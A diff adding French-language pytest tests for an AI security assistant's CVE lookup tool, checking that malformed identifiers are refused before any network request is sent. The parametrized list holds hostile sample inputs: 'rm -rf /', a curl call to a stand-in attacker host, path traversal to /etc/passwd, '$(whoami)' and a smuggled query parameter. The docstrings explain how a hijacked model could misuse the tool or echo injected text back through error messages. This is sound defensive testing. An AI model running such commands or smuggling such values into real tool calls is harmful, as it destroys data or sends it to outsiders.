@@ -12,14 +12,20 @@ envoye par un inconnu.
 
 from __future__ import annotations
 
+from collections.abc import Callable
+
+import httpx
 import pytest
 
+from aisecassist.agents.cve import CveLookupTool
 from aisecassist.agents.tools import AUCUN_EXTRAIT, CorpusSearchTool, ToolArgumentError
 from aisecassist.security.limits import MAX_QUESTION_LENGTH
 from aisecassist.vectorstore.base import SearchResult
 from tests.doubles import FakeEmbedder, FakeVectorStore, extrait, make_retrieval
 
 pytestmark = pytest.mark.anyio
+
+CveHandler = Callable[[httpx.Request], httpx.Response]
 
 _NONCE = "0123456789abcdef0123456789abcdef"
 
@@ -124,3 +130,94 @@ async def test_sans_extrait_pertinent_lobservation_le_dit_explicitement() -> Non
 
     assert resultat.observation == AUCUN_EXTRAIT
     assert resultat.sources == ()
+
+
+# --- Outil CVE : l'argument part vers un service externe (ticket 20) ----------
+#
+# Jusqu'ici un argument d'outil restait une chaine de recherche. Celui-ci
+# devient une valeur transmise a un tiers : sa validation n'est plus une
+# question de robustesse, c'est la barriere.
+
+
+def _outil_cve(handler: CveHandler | None = None) -> tuple[CveLookupTool, list[httpx.Request]]:
+    """Rend l'outil et la liste — observable — des requetes reellement emises."""
+    emises: list[httpx.Request] = []
+
+    def enregistrer(request: httpx.Request) -> httpx.Response:
+        emises.append(request)
+        return handler(request) if handler else httpx.Response(200, json={"vulnerabilities": []})
+
+    client = httpx.AsyncClient(
+        transport=httpx.MockTransport(enregistrer), base_url="https://nvd.test"
+    )
+    outil = CveLookupTool(
+        base_url="https://nvd.test",
+        timeout_s=5.0,
+        description_max_chars=1_500,
+        client=client,
+    )
+    return outil, emises
+
+
+@pytest.mark.parametrize(
+    "charge",
+    [
+        "CVE-2021-44228; rm -rf /",
+        "CVE-2021-44228 && curl attaquant.example",
+        "CVE-2021-44228&resultsPerPage=2000",
+        "CVE-2021-44228/../../../etc/passwd",
+        "http://attaquant.example/CVE-2021-44228",
+        "../../etc/passwd",
+        "CVE-20211-44228",
+        "CVE-2021-442",
+        "$(whoami)",
+        "",
+    ],
+)
+async def test_un_identifiant_non_conforme_nemet_aucune_requete(charge: str) -> None:
+    """Le point central de l'outil CVE : la validation precede le reseau.
+
+    Verifier que l'appel est refuse ne suffit pas — il faut verifier qu'**aucune
+    requete n'est partie**. C'est cette propriete, et elle seule, qui interdit a
+    un modele detourne de se servir du serveur pour joindre un tiers.
+    """
+    outil, emises = _outil_cve()
+
+    with pytest.raises(ToolArgumentError):
+        await outil.run({"identifiant": charge})
+
+    assert emises == []
+
+
+async def test_un_argument_inattendu_est_refuse_par_loutil_cve() -> None:
+    """`extra="forbid"` aussi ici : pas de parametre clandestin vers le service."""
+    outil, emises = _outil_cve()
+
+    with pytest.raises(ToolArgumentError):
+        await outil.run({"identifiant": "CVE-2021-44228", "apiKey": "vole"})
+
+    assert emises == []
+
+
+async def test_un_identifiant_du_mauvais_type_est_refuse() -> None:
+    outil, emises = _outil_cve()
+
+    with pytest.raises(ToolArgumentError):
+        await outil.run({"identifiant": {"cveId": "CVE-2021-44228"}})
+
+    assert emises == []
+
+
+async def test_le_refus_ne_renvoie_pas_la_valeur_fautive() -> None:
+    """Le message part vers le modele, puis potentiellement vers la reponse.
+
+    Y recopier l'argument refuse rendrait l'outil complice de l'injection qu'il
+    vient de bloquer : la charge reviendrait dans le prompt par la porte du
+    message d'erreur.
+    """
+    outil, _ = _outil_cve()
+
+    with pytest.raises(ToolArgumentError) as capture:
+        await outil.run({"identifiant": "CVE-2021-44228; rm -rf /"})
+
+    assert "rm -rf" not in str(capture.value)
